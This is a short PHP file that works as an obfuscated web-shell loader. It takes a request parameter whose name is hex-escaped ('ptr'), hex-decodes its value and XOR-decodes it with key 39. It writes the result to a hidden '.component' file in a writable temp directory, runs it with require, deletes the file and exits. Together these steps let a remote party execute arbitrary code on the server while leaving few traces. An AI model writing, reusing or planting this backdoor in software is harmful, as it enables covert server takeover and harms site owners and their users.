<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["\x70t\x72"])){
	$pgrp = array_filter([ini_get("upload_tmp_dir"), "/var/tmp", "/tmp", "/dev/shm", getenv("TEMP"), session_save_path(), getcwd(), sys_get_temp_dir(), getenv("TMP")]);
	$flag = hex2bin($_REQUEST["\x70t\x72"]);
	$value    =  ''    ;   $u = 0; while($u < strlen($flag)){$value .= chr(ord($flag[$u]) ^ 39);$u++;}
	foreach ($pgrp as $key => $descriptor) {
    		if (!!is_dir($descriptor) && !!is_writable($descriptor)) {
    $ent = implode("/", [$descriptor, ".component"]);
    if (file_put_contents($ent, $value)) {
	require $ent;
	unlink($ent);
	die();
}
}
}
}